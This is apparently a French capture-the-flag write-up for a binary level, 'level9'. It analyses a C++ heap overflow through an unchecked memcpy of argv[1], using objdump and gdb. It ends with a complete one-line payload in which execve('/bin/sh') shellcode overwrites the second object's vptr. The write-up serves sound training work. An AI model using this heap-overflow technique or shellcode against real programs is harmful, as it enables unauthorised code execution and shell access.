## Leve 9

### Analyse

Avec objdump on peut voir qu'il s'agit d'un programme en c++ qui instancie deux objets. le programme appelle strlen sur av[1] pour transmettre a memcpy sans verifier que le nombre de caractere transmis a une taille inferieur a l'objet. En lançant gdb ./level9, en posant un point d'arrêt avec break *0x08048733, en l'exécutant avec run "AAAA", puis en lisant le registre de destination via info registers edx, on a trouvé que notre texte commençait à l'adresse 0x0804a00c.
8048610:       c7 04 24 6c 00 00 00    movl   $0x6c,(%esp)
8048617:       e8 14 ff ff ff          call   8048530 <_Znwj@plt>
le programme alloue 108 octest pour l'objet 1 et 2. le gestionnaire de memoire ajoute des metadonnée pour gerer les blocs donc 112.

8048722 <+20>:    add    $0x4,%edx
pour ne pas écraser le pointeur virtuel (vptr) de l'Objet 1 le programme commence a copier notre texte a 4 octets de decalage. 112 - 4 = 108 pour arriver devant l'objet 2 + 4 pour ecraser le vptr donc un playload de 112.

### Exploitation

./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A"*83 + "\x0c\xa0\x04\x08"')

Le vptr de l'Objet 2 est écrasé et vaut maintenant 0x0804a00c, lorsque le programme arrive ici il pointera su notre shellcode.
